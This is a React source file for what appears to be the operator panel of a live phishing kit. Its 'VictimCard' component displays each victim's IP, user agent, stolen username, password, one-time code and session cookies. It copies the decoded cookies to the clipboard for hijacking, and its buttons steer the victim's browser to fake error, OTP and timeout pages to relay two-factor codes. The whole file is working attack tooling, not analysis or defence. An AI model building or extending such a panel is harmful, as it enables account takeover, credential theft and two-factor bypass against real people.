"use client";
import React from "react";
// import Link from 'next/link'
import {
  Button,
  Card,
  CardHeader,
  CardBody,
  CardFooter,
  Divider,
  Link,
  Image,
  Input,
} from "@nextui-org/react";
import { data } from "autoprefixer";
import { revalidatePath } from "next/cache";
import { Formik, Field, Form, FormikHelpers } from "formik";
import { useRouter } from "next/router";
import { toast } from "react-hot-toast";
import { useState, useEffect } from "react";

export default function VictimCard({
  id,
  ip,
  OTP,
  username,
  password,
  action,
  user_agent,
  Cookies,
}) {
  const [curr_OTP, setCurrOTP] = useState(0);
  useEffect(() => {
    setCurrOTP(OTP);
  }, [OTP]);

  const [curr_action, setCurrAction] = useState(0);
  useEffect(() => {
    setCurrAction(action);
  }, [action]);

  const [curr_Cookies, setCurrCookies] = useState(0);
  useEffect(() => {
    setCurrCookies(Cookies);
  }, [Cookies]);

  const copyCookie = (e) => {
    let buff = new Buffer(curr_Cookies, "base64");
    let text = buff.toString("ascii");
    navigator.clipboard.writeText(text);
    toast.success(`Enjoy some cookies 🍪`);
  };

  const CookiesSwticher = () => {
    if (curr_Cookies == "None") {
      return;
    } else {
      return (
        <Button
          onPress={copyCookie}
          color="default"
          className="size-fit text-gray-900 bg-white hover:bg-gray-100 border border-gray-200 focus:ring-4 focus:outline-none focus:ring-gray-100 font-medium rounded-lg text-sm px-5 py-2.5 text-center inline-flex items-center dark:focus:ring-gray-600 dark:bg-gray-800 dark:border-gray-700 dark:text-white dark:hover:bg-gray-700 me-2 mb-2"
        >
          Copy 🍪 to 📋
        </Button>
      );
    }
  };
  const router = useRouter();
  const sendToError = async () => {
    try {
      const res = await fetch(`${process.env.API_URL}/action/${id}/error`, {
        method: "PUT",
        cache: "no-cache",
      });
    } catch (error) {}
    setCurrAction("error");
    toast.success(`Sent ${id} to error`);
  };
  const sendToInvalid = async () => {
    try {
      const res = await fetch(`${process.env.API_URL}/action/${id}/invalid`, {
        method: "PUT",
        cache: "no-cache",
      });
    } catch (error) {}
    setCurrAction("invalid");
    toast.success(`Sent ${id} to invalid`);
  };
  const sendToOTP2 = async () => {
    try {
      const res = await fetch(`${process.env.API_URL}/action/${id}/OTP2`, {
        method: "PUT",
        cache: "no-cache",
      });
    } catch (error) {}
    setCurrAction("OTP2");
    toast.success(`Sent ${id} to OTP2`);
  };
  const sendToTimeout = async () => {
    try {
      const res = await fetch(`${process.env.API_URL}/action/${id}/timeout`, {
        method: "PUT",
        cache: "no-cache",
      });
    } catch (error) {}
    setCurrAction("timeout");
    toast.success(`Sent ${id} to timeout`);
  };
  const sendToOTP = async () => {
    try {
      const res = await fetch(`${process.env.API_URL}/action/${id}/OTP`, {
        method: "PUT",
        cache: "no-cache",
      });
    } catch (error) {}
    setCurrAction("OTP");
    toast.success(`Sent ${id} to OTP`);
  };
  const sentToDummyPage = async () => {
    try {
      const res = await fetch(`${process.env.API_URL}/action/${id}/dummyPage`, {
        method: "PUT",
        cache: "no-cache",
      });
    } catch (error) {}
    setCurrAction("dummyPage");
    toast.success(`Sent ${id} to dummyPage`);
  };
  const setOTP = async (values, { setSubmitting }) => {
    try {
      const res = await fetch(
        `${process.env.API_URL}/OTP/${id}/${values.OTP}`,
        { method: "PUT", cache: "no-cache" }
      );
      if (JSON.parse(await res.json()).status == "OK") {
        toast.success(`set OTP ${values.OTP} to ID ${id} `);
        // setCurrOTP(await fetch(`${process.env.API_URL}/OTP/${id}`,{method: 'GET',cache: "no-cache"}));
        // useEffect(()=>{
        setCurrOTP(values.OTP);
        sendToOTP();
        // })
      } else {
        throw new Error("ERROR from backend");
      }
    } catch (error) {
      toast.error("(╯°□°)╯︵ ┻━┻   " + error);
    }
  };
  return (
    // <Link href={href} className=''>
    // {title}
    // </Link>
    <Card className="max-w-[600px] bg-slate-800 m-2 rounded-xl content-center ">
      <CardHeader className="flex gap-3">
        <div className="flex flex-col text-left">
          <div className="flex flex-row justify-between">
            <div>
              <p className="text-md">
                <span className="text-sky-500">ID:</span> {id}
              </p>
              <p className="text-md">
                <span className="text-sky-500">IP:</span> {ip}
              </p>
            </div>
            {CookiesSwticher()}
          </div>
          <p className="text-md">
            <span className="text-sky-500"> user_agent: </span>
            {user_agent}
          </p>
        </div>
      </CardHeader>
      <Divider />
      <CardBody>
        <p>
          <span className="text-sky-500">Username:</span> {username}{" "}
        </p>
        <p>
          <span className="text-sky-500">Password:</span> {password}
        </p>
        <p>
          <span className="text-sky-500">Action:</span> {curr_action}
        </p>
        <p>
          <span className="text-sky-500">OTP:</span> {curr_OTP}
        </p>
      </CardBody>
      <Divider />
      <CardFooter className="flex justify-between content-center gap-1">
        <Button onPress={sendToError} color="danger" className="">
          Error
        </Button>
        <Button onPress={sendToInvalid} color="warning" className="">
          Invalid
        </Button>
        <Formik
          initialValues={{
            OTP: "",
          }}
          onSubmit={setOTP}
        >
          <Form className="flex justify-center content-center w-40 ">
            <div className="">
              <Field
                id="OTP"
                name="OTP"
                placeholder="OTP"
                type="text"
                className="form-control h-10 bg-gray-200 appearance-none border-2 border-gray-200 rounded-l-lg w-full py-2 px-1 text-gray-700 leading-tight focus:outline-none focus:bg-white focus:border-sky-600"
              />
            </div>
            <Button type="submit" color="primary" className="rounded-l-none ">
              Send
            </Button>
          </Form>
        </Formik>
        <Button onPress={sendToOTP2} color="primary" className="">
          OTP2
        </Button>
        <Button onPress={sendToTimeout} color="primary" className="">
          Timeout
        </Button>
        <Button onPress={sentToDummyPage} color="default" className="">
          DummyPage
        </Button>
      </CardFooter>
    </Card>
  );
}
